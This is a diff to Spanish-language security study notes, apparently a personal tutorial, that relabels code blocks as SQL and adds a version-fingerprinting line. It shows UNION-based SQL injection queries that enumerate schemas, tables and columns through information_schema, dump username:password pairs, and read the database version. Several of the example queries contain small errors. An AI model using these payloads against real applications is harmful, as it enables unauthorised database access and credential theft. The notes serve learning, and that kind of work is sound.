@@ -417,7 +417,7 @@ Esta herramienta automatiza las inyecciones SQL y para su uso podemos leerlo por
 Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
 para jugar
 
-```bash
+```sql
 service mysql start
 mysql -uroot
 create table Tabla1(id int(2), username varchar(32), password(32));
@@ -440,26 +440,31 @@ En el código anterior vemos distintos parametros
 
 Para listar la base de datos de manera alternativa podemos usar el siguiente código:
 
-```bash
+```sql
 select * from Tabla1 where id= 1 union select 1,schema_name,3,4 from information_schema.schemata
 ```
 
 Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:
 
-```bash
+```sql
 select * from Tabla1 where id= 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = 'Table1';-- -;
 ```
 
 Para listar las columnas el siguiente código:
 
-```bash
+```sql
 select * from Tabla1 where id=1 union select 1, column_name,3,4 from information_schema.columns where table_schema='Table1' and table_name='Nombre_de_la_tabla' 
 ```
 
 Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:
 
-```bash
+```sql
 select * from Tabla1 where id=1 union select 1, concat(username,0x3a,password),3,4 from Tabla1.'Nombre_de_la_tabla'
+```
+Para poder obtener la versión de la base de datos que se está usando, también lo podemos hacer con el siguiente comando
+
+```sql
+' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
 ```
 
 ## Vulnerabilidad Padding Oracle Attack - Padbuster
